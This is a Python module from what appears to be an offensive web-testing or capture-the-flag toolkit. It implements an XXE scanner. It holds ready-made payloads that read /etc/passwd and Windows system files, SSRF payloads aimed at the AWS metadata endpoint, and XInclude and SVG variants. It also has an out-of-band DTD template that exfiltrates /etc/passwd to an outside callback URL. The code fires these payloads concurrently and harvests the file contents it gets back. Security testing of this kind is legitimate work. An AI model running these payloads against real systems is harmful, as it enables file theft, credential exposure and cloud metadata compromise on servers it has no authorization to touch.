"""XXE (XML External Entity) scanner module."""

import asyncio
import re
from typing import Optional, Callable

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...utils.logger import log_info, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor


# Basic XXE payloads
BASIC_XXE_PAYLOADS = [
    # File read - Linux
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',

    # File read - Windows
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
]

# SSRF via XXE
SSRF_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>',
]

# Parameter entity XXE (for blind)
PARAMETER_ENTITY_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback}"> %xxe;]><foo>test</foo>',
]

# XInclude payloads (for when you can't control DOCTYPE)
XINCLUDE_PAYLOADS = [
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hosts"/></foo>',
]

# SVG XXE
SVG_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
]

# Patterns indicating XXE success
XXE_SUCCESS_PATTERNS = [
    r'root:x:0:0',  # /etc/passwd
    r'root:.*:0:0',
    r'\[fonts\]',  # win.ini
    r'\[boot loader\]',  # boot.ini
    r'127\.0\.0\.1\s+localhost',  # /etc/hosts
    r'ami-id',  # AWS metadata
    r'instance-id',
]


class XxeScanner(AttackModule):
    """XXE vulnerability scanner."""

    @property
    def name(self) -> str:
        return "XXE Scanner"

    @property
    def description(self) -> str:
        return "Scans for XML External Entity injection vulnerabilities"

    def __init__(self, ctx: AttackContext, callback_url: Optional[str] = None):
        """
        Initialize XXE scanner.

        Args:
            ctx: Attack context
            callback_url: URL for blind XXE detection (OOB)
        """
        super().__init__(ctx)
        self.callback_url = callback_url
        self.flag_extractor = FlagExtractor()
        self.vulnerable_payloads: list[dict] = []
        self.extracted_files: list[dict] = []

        # Set content type for XML
        if "Content-Type" not in self.ctx.headers:
            self.ctx.headers["Content-Type"] = "application/xml"

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        include_ssrf: bool = True,
        include_xinclude: bool = True
    ) -> list[dict]:
        """
        Scan target for XXE vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            on_finding: Callback function when vulnerability found
            include_ssrf: Include SSRF via XXE payloads
            include_xinclude: Include XInclude payloads

        Returns:
            List of findings
        """
        if payloads is None:
            payloads = self._get_default_payloads(include_ssrf, include_xinclude)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} XXE payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")

        # Setup baseline
        await self.setup()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for XXE...", total=len(payloads))

            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"][:50] + "..."
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        include_ssrf: bool = True,
        include_xinclude: bool = True
    ) -> list[dict]:
        """Synchronous scan."""
        if payloads is None:
            payloads = self._get_default_payloads(include_ssrf, include_xinclude)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} XXE payloads")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for XXE...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single XXE payload asynchronously."""
        try:
            # For XXE, we typically need to send the payload as the body
            response = await self.client.request_with_payload(payload)

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            # Check for XXE indicators
            is_vulnerable, evidence, xxe_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"XXE ({xxe_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(xxe_type),
                    "xxe_type": xxe_type,
                    "flags_found": flags,
                    "response_length": response.content_length,
                }

                # Extract file content if found
                if xxe_type == "file_read":
                    self.extracted_files.append({
                        "payload": payload,
                        "content": evidence,
                    })

                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing XXE payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            response = self.client.request_with_payload_sync(payload)

            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            is_vulnerable, evidence, xxe_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"XXE ({xxe_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(xxe_type),
                    "xxe_type": xxe_type,
                    "flags_found": flags,
                }

                if xxe_type == "file_read":
                    self.extracted_files.append({
                        "payload": payload,
                        "content": evidence,
                    })

                self.vulnerable_payloads.append(finding)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing XXE payload: {e}")

        return None

    def _check_vulnerability(
        self, response: Response, payload: str
    ) -> tuple[bool, str, str]:
        """Check if XXE was successful."""
        text = response.text

        # Check for file content patterns
        for pattern in XXE_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                # Determine XXE type
                if "file://" in payload:
                    return True, match.group()[:100], "file_read"
                elif "http://" in payload:
                    return True, match.group()[:100], "ssrf"

        # Check for error-based XXE indicators
        error_patterns = [
            r'failed to load external entity',
            r'XMLReader::read',
            r'simplexml_load_',
            r'DOMDocument',
            r'xml parsing error',
            r'EntityRef:',
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True, f"XML parsing error indicates XXE processing", "error_based"

        # Check for content length changes (might indicate entity expansion)
        if self.analyzer:
            if response.content_length > self.analyzer.baseline.content_length * 2:
                return True, "Response significantly larger - possible entity expansion", "entity_expansion"

        return False, "", ""

    def _calculate_confidence(self, xxe_type: str) -> str:
        """Calculate confidence level."""
        confidence_map = {
            "file_read": "high",
            "ssrf": "high",
            "error_based": "medium",
            "entity_expansion": "low",
        }
        return confidence_map.get(xxe_type, "low")

    def _get_default_payloads(self, include_ssrf: bool, include_xinclude: bool) -> list[str]:
        """Get default XXE payloads."""
        payloads = BASIC_XXE_PAYLOADS.copy()

        if include_ssrf:
            payloads.extend(SSRF_XXE_PAYLOADS)

        if include_xinclude:
            payloads.extend(XINCLUDE_PAYLOADS)

        # Add SVG XXE
        payloads.extend(SVG_XXE_PAYLOADS)

        # Add blind XXE if callback URL provided
        if self.callback_url:
            for template in PARAMETER_ENTITY_PAYLOADS:
                payloads.append(template.format(callback=self.callback_url))

        return payloads

    def generate_payload(self, file_path: str, entity_name: str = "xxe") -> str:
        """Generate XXE payload for a specific file."""
        return f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY {entity_name} SYSTEM "file://{file_path}">]><foo>&{entity_name};</foo>'

    def generate_oob_payload(self, dtd_url: str) -> str:
        """Generate out-of-band XXE payload."""
        return f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "{dtd_url}">%dtd;%send;]><foo>test</foo>'

    def get_dtd_template(self, exfil_url: str) -> str:
        """Get external DTD template for blind XXE data exfiltration."""
        return f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{exfil_url}/?data=%file;'>">
%eval;
%exfil;'''
